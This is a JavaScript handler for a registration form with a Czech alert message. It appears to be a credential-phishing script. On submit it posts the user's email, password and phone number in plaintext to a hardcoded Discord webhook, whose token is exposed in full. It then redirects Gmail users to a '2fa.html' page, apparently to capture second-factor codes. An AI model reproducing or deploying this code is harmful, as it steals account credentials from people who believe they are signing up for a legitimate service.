const form = document.getElementById("register");

form.addEventListener("submit", async (event)=>
{
    event.preventDefault();



    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const num = document.getElementById("tel.num").value;

    if(password!=document.getElementById("password2").value)
    {
        window.alert("hesla se neshodují")
    }

    else
    {
        localStorage.setItem("email", email);
        const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}`;
        
        await fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
        {
            method: "POST", 
            headers: 
            {
                "Content-Type" : "application/json"
            },
            body: JSON.stringify({
                username: "Dáda",
                content: content
            })
        })

        if(email.split('@')[1] == "gmail.com")
        {
            window.location.href = "/2fa.html";
        }
    }
});